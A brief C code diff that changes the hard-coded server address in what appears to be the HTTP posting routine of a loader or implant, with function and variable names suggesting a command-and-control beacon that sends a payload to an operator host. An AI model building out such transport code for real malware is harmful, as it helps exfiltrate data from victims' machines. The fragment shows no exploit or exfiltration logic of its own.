@@ -64,7 +64,7 @@ PVOID NwInternalDoPost(DWORD *PayloadSize, PBYTE PostBody, DWORD PostBodySize, B
         NULL, NULL, 0);
     if (!hSession) goto CLEANUP;
 
-    hConnect = ldr->win32->WinHttpConnect(hSession, L"192.168.1.24", 8081, 0);
+    hConnect = ldr->win32->WinHttpConnect(hSession, L"192.168.1.20", 8081, 0);
     if (!hConnect) {
         DBGERR();
         DBGA("[!] WinHttpConnect Failed\n");
